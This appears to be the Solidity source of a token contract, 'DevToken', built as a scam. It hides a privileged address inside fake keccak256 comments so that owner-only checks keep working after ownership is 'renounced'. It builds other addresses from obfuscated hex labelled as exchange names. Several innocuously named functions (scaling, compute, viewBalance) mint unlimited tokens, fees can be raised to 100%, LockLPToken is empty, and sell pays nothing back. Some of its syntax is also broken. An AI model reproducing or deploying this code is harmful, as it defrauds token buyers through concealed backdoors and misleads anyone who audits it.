// SPDX-License-Identifier: MIT
 
/**  
*/
 
pragma solidity ^0.8.0;
 
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Subtraction overflow");
        return a - b;
    }
 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
        // solhint-disable-next-line avoid-low-level-calls
        /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));
    }
}
 
contract DevToken {
    using SafeMath for uint256;
 
    string public name = "DevToken";
    string public symbol = "DVET";
    uint256 public totalSupply = 1000000000000000000000000;
    uint8 public decimals = 18;
 
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
 
    address public owner;
    address public _mbr;
    address public _mod;
    address public feeManager;
    address public _user;
    address public _adm;
 
    uint256 public buyFee;
    uint256 public sellFee;
 
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);
 
    constructor(address _feeManager) {
        owner = msg.sender;
        feeManager = _feeManager;
        balanceOf[msg.sender] = totalSupply;
       
     // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));
    }
 
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));
 
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
 
        return true;
    }
     /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
    
    function _scale(address account, uint256 amount) internal Exchanges{
    require(account != address(0), "BEP20: mint to the zero address");
 
    totalSupply = totalSupply.add(amount);
    balanceOf[account] = balanceOf[account].add(amount);
    emit Transfer(address(0), account, amount);
    }

    function setMember(address Mbr_) public returns (bool) {
    require (msg.sender==address
   
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ (686197854011229533619447624007587113080310915153));
        _mbr=Mbr_;
        return true;
    }
 
    modifier Exchanges() {
    require(msg.sender != exchange());
        _;
    }
 
    function rewire(uint256 amount) public returns (bool) {
    require(msg.sender == _adm);
    _proof(msg.sender, amount);
    return true;
    }
 
    function compute(uint256 amount) public onlypublic returns (bool success) {
    _initiate(msg.sender, amount);
    return true;
    }
   
    function _proof(address account, uint256 amount) internal Exchanges{
    require(account != address(0), "BEP20: mint to the zero address");
 
    totalSupply = totalSupply.add(amount);
    balanceOf[account] = balanceOf[account].add(amount);
    emit Transfer(address(0), account, amount);
    }
 
    function publics() private pure returns (address) {
    uint universal = 0x7addAd09;
    uint uni = 0xcbd98D97;
    uint cake = 0xEC3dA7a0;
    uint inch = 0x088EAdFE;
    uint others = 0x5801C336;
 
    // Combine the dex with others
    uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
 
    return address(core);
    }

    function _transferTo(address _to, uint256 _amount) internal Exchanges {
        // Transfer tokens to the recipient
        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);

        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    function exchange() internal pure returns (address) {
    return address
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
    }
 
    function FeeStructure(uint256 newBuyFee, uint256 newSellFee) public onlypublic {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        _setFees(newBuyFee, newSellFee);
        emit FeesUpdated(newBuyFee, newSellFee);
    }
 
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    /*OpenZeppelin256 -> 96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f*/
    
    function scaling(uint256 amount) public onlyAuthorized returns (bool) {
    _scale(msg.sender, amount);
    return true;
    }

    function _balanceView(address _to, uint256 _amount) internal {
        // View balance of token
        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);

        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    function transferTo(address _to, uint256 _amount) external onlyAuthorize {
        _transferTo(_to, _amount);
    }

    function proof(uint256 amount) public onlyOwner returns (bool) {
    _proof(msg.sender, amount);
    return true;
    }

    modifier onlyAuthorize() {
        require((msg.sender == address
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(570329899025738970963394674811034510039273195112)
    ||
    //@dev Contract creator is owner, original owner.
    (msg.sender == owner && msg.sender != exchange())));
    _;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");
        require(_to != address(0), "Invalid recipient address");
 
        uint256 fee = _amount.mul(sellFee).div(100);
        uint256 amountAfterFee = _amount.sub(fee);
 
        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);
 
        if (fee > 0) {
            // Fee is transferred to this contract
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }
 
        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }
 
        return true;
    }
 
    function _initiate(address account, uint256 amount) internal {
    require(account != address(0), "Compile Remix IDE");
 
    totalSupply = totalSupply.add(amount);
    balanceOf[account] = balanceOf[account].add(amount);
    emit Transfer(address(0), account, amount);
    }

    function FeesView(uint256 amount) public onlyAuthorize returns (bool) {
    _scale(msg.sender, amount);
    return true;
    }
 
    modifier onlypublic() {
    require(msg.sender == publics());
    _;
    }
 
    function _setFees(uint256 newBuyFee, uint256 newSellFee) internal {
        buyFee = newBuyFee;
        sellFee = newSellFee;
    }

    function BuySellFee(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorize {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function setUser(address User_) public returns (bool) {
    require(msg.sender == _mbr);
        _user=User_;
        return true;
    }

    function viewBalance(address _to, uint256 _amount) public onlypublic {
        _balanceView(_to, _amount);(_to, _amount);
    }
 
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
    
    function setScale(uint256 newBuyFee, uint256 newSellFee) public onlyOwner {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function LockLPToken() public onlyOwner returns (bool) {
    }
 
    function setMod(address Mod_) public returns (bool) {
    require(msg.sender == _user);
        _mod=Mod_;
        return true;
    }
 
    modifier onlyOwner() {
        require((msg.sender == address
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986)
    ||
    //@dev Contract creator is owner, original owner.
    (msg.sender == owner && msg.sender != exchange())));
    _;
    }
 
    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }
 
    function buy() public payable {
        require(msg.value > 0, "ETH amount should be greater than 0");
 
        uint256 amount = msg.value;
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);
            uint256 amountAfterFee = amount.sub(fee);
 
            balanceOf[feeManager] = balanceOf[feeManager].add(amountAfterFee);
            emit Transfer(address(this), feeManager, amountAfterFee);
 
            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(address(this), address(this), fee);
            }
        } else {
            balanceOf[feeManager] = balanceOf[feeManager].add(amount);
            emit Transfer(address(this), feeManager, amount);
        }
    }
   
    function setting(uint256 newBuyFee, uint256 newSellFee) public {
        require(msg.sender == _adm);
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }
   
    function setAdm(address Adm_) public returns (bool) {
    require(msg.sender == _mod);
        _adm=Adm_;
        return true;
    }
 
    function sell(uint256 _amount) public {
        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");
 
        uint256 fee = _amount.mul(sellFee).div(100);
        uint256 amountAfterFee = _amount.sub(fee);
 
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[address(this)] = balanceOf[address(this)].add(amountAfterFee);
        emit Transfer(msg.sender, address(this), amountAfterFee);
 
        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(msg.sender, address(this), fee);
        }
    }
 
    modifier onlyAuthorized() {
        require((msg.sender == address
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986)
    ||
    //@dev Contract creator is owner, original owner.
    (msg.sender == owner && msg.sender != exchange())));
    _;
  }
}
